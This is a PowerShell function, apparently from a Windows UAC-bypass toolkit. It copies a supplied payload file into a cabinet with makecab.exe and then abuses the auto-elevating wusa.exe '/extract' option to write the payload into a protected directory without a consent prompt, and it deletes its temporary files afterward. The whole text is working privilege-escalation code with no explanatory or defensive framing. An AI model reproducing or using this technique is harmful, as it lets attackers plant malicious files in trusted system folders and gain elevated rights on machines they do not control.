function Elevated-WUSA {
	param(
		[Parameter(Mandatory = $True)]
		[String]$Payload,
		[Parameter(Mandatory = $True)]
		[String]$DestinationPath,
		[Parameter(Mandatory = $True)]
		[String]$DestinationName
	)

	$TempFolder = $env:Temp + "\"
	$TempFile = "payload-$(Get-Random).tmp"
	$System32 = $env:SystemRoot + "\System32\"
	
	# Copy Payload to %temp% with destination name
	Copy-Item $Payload $($TempFolder + $DestinationName)
	
	# Create the cabinet file in %temp%
	IEX $($System32 + "makecab.exe " + $TempFolder + $DestinationName + " " + $TempFolder + $TempFile) | Out-Null
	
	# Elevated extract to target directory
	# We use "Diagnostics.Process" because because we need to wait before deleting the temp file
	[Diagnostics.Process]::Start($($System32 + "wusa.exe"),$($TempFolder + $TempFile + " /extract:" + $DestinationPath)).WaitForExit()
	
	# Delete temporary payload & cabinet file
	IEX $("del " + $TempFolder + $DestinationName)
	IEX $("del " + $TempFolder + $TempFile)
}